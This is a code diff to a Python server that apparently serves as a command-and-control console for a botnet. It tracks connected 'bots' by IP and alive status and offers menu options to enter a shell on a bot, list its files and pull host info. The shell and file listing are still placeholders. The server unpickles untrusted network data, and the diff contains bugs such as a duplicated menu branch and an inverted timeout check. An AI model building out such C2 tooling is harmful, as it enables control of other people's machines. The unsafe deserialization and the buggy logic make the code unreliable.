@@ -10,7 +10,6 @@ init(autoreset=True)
 
 addr = ('192.168.0.224', 5000)
 #decryptor = security.get_decryptor()
-#todo - client->server communication encrypted, server->client not
 
 standard_text = Fore.YELLOW
 warning_text = Fore.RED + Style.BRIGHT
@@ -22,18 +21,23 @@ def is_int(str):
     except:
         return False
 
-def get_choice(opts, title):
+def get_choice(opts, title, subtitle=None):
     opt = None
     while not opt or not is_int(opt) or not 1 <= int(opt) <= len(opts):
         print(Back.CYAN + Fore.BLACK + ' ' + title + ' ')
+        if subtitle:
+            print(Fore.CYAN + Style.BRIGHT + subtitle)
         for opt in enumerate(opts):
             print(f'{Fore.BLUE}{opt[0] + 1}. {opt[1]}')
         opt = input(Fore.CYAN + '> ')
     return int(opt) - 1
 
 def show(d):
-    for value in d:
-        print(f'{Fore.GREEN + Style.BRIGHT}{value.capitalize()}: {Fore.MAGENTA}{d[value]}')
+    if isinstance(d, dict):
+        for value in d:
+            print(f'{Fore.GREEN + Style.BRIGHT}{value.capitalize()}: {Fore.MAGENTA}{d[value]}')
+    else:
+        print(f'{Fore.GREEN + Style.BRIGHT + d}')
 
 def get_user(id):
     for user in users:
@@ -49,10 +53,18 @@ class User():
         self.msg = None
         self.alive = True
         self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
+        self.hist.append({'from': 'server', 'msg': 'client connected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
+        threading.Thread(target=self.keep_alive, args=()).start()
+
+    def restart(self, conn):
+        self.alive = True
+        self.conn = conn
+        self.port = conn[1][1]
+        self.hist.append({'from': 'server', 'msg': 'client reconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
         threading.Thread(target=self.keep_alive, args=()).start()
 
     def keep_alive(self):
-        while True:
+        while self.alive:
             try:
                 self.conn[0].send(pickle.dumps('keepalive'))
                 time.sleep(3)
@@ -65,13 +77,19 @@ class User():
         self.conn[0].send(pickle.dumps(msg))
         self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
 
-    def get_response(self): #todo add what to do if client dc while waiting for response
+    def get_response(self):
         # get next msg from user
-        print(standard_text + 'Waiting for client response...') #todo prob add timeout
+        self.start = time.time()
+        print(standard_text + 'Waiting for client response...')
         self.old_num = len([m for m in self.hist if m['from'] == 'client'])
-        while self.old_num == len([m for m in self.hist if m['from'] == 'client']):
+        while self.alive and self.old_num == len([m for m in self.hist if m['from'] == 'client']) and time.time() - self.start < 30:
             pass
-        return [m for m in self.hist if m['from'] == 'client'][-1]['msg']
+        if not self.alive:
+            return 'Clent disconnected'
+        elif time.time() - self.start < 30:
+            return 'Client response timed out'
+        else:
+            return [m for m in self.hist if m['from'] == 'client'][-1]['msg']
 
     def read(self):
         try:
@@ -85,64 +103,63 @@ class User():
             self.hist.append({'from': 'client', 'msg': self.msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
             return self.msg
 
+    def manage(self):
+        while self.alive:
+            self.m = self.read()
+            if self.m == -2:
+                return
+            elif not self.m:
+                self.send('Invalid input recieved')
+
 def clean(msg):
     try:
         #msg = decryptor.decrypt(msg)
         return pickle.loads(msg)
     except ValueError:
         return -1
-
-def handle_user(user):
-    while user.alive: #todo maybe dont stop monitoring on dc?
-        msg = user.read()
-        if msg:
-            if msg == -2:
-                #print(f'{user.ip}:{user.port} disconnected')
-                return
-            else:
-                #print(f'msg recv from user at {user.ip}:{user.port}: {msg}')
-                user.send('Msg from server') #todo should i remove this?
-        else:
-            #todo make this better
-            #print(f'invalid msg recv from {user.ip}:{user.port}, notifying client')
-            user.send('Invalid input recieved')
-#todo if dc and reconnect from one client, port changes -> user changes, false extra in list of bots
-def get_instructions(): #todo add file down/uploading from bot, add more options
+#todo bots saved only in memory, maybe save connection details to file?
+def get_instructions(): #todo add file down/uploading from bot, get bot's file structure, add more options
     opt = get_choice(['Select a bot'], 'Main Menu')
     if opt == 0:
-        curr_users = [u.id for u in users]  # in case list of users changes before selection made
-        opt = get_choice([f'{user.name} | {user.ip}:{user.port} | {"ALIVE" if user.alive else "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:' if len(users) > 0 else f'Select a bot: {warning_text} No bots found!!!')
-        if opt == len(curr_users):
-            get_instructions()
-        else:
-            user = get_user(curr_users[opt])
-            if user.alive:
-                bot_opts = ['Enter Shell', 'View bot info', 'View bot session logs', 'Main Menu']
-                opt = get_choice(bot_opts, 'Choose an action:')
+        if len(users) > 0:
+            curr_users = [u.id for u in users]  # in case list of users changes before selection made
+            opt = get_choice([f'{user.name} | {user.ip}:{user.port} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP:port | Status')
+            if opt != len(curr_users):
+                user = get_user(curr_users[opt])
+                bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
+                opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip}:{user.port} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
                 if opt == 0:
-                    cmd = input('Enter a command: ')
-                    confirm = input(f'Are you sure you would like to run "{cmd}" on {user.ip}:{user.port}? (y/n) ')
-                    if confirm.lower().startswith('y'):
-                        print(standard_text + f'Running command...')
-                        print('TODO make command actually run') #TODO turn this section into shell
+                    if user.alive:
+                        #TODO turn this section into shell
+                        print('shellllllllllllllllllllllllllllll')
+                    else:
+                        print(warning_text + 'Dead bot, chose a live one')
                 elif opt == 1:
-                    user.send('getinfo')
-                    response = user.get_response()
-                    print(standard_text + f'Client info received from {user.name}:')
-                    show(response)
+                    if user.alive:
+                        print('todo get bots files') #todo get bots files
+                    else:
+                        print(warning_text + 'Dead bot, chose a live one')
                 elif opt == 2:
-                    for msg in user.hist: #todo just give last 100 lines? add option for full?
+                    if user.alive:
+                        user.send('getinfo')
+                        response = user.get_response()
+                        print(standard_text + f'Client info received from {user.name}:')
+                        show(response)
+                    else:
+                        print(warning_text + 'Dead bot, chose a live one')
+                elif opt == 2:
+                    for msg in user.hist:
                         print(Fore.MAGENTA + f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
-                get_instructions()
-            else:
-                print(warning_text + 'Dead bot, chose a live one')
-                get_instructions()
+        else:
+            print(warning_text + 'No bots found')
+        get_instructions()
 
 def run():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(addr)
     server.listen()
     print(standard_text + f'Server running on {addr[0]}:{addr[1]}')
+    print(standard_text + 'Wait a few seconds for any live bots to connect')
 
     threading.Thread(target=get_instructions, args=()).start()
 
@@ -151,9 +168,16 @@ def run():
         try:
             name = conn[0].recv(4096)
             name = clean(name)['name']
-            user = User(conn, name)
-            users.append(user)
-            threading.Thread(target=handle_user, args=(user, )).start()
+            user = None
+            for u in users:
+                if  u.ip == conn[1][0]:
+                    user = get_user(u.id)
+                    user.restart(conn)
+                    break
+            if not user:
+                user = User(conn, name)
+                users.append(user)
+            threading.Thread(target=user.manage, args=()).start()
         except:
             print(warning_text + 'Discarding connection because invalid name recieved from {conn[1][0]}:{conn[1][1]}')
 
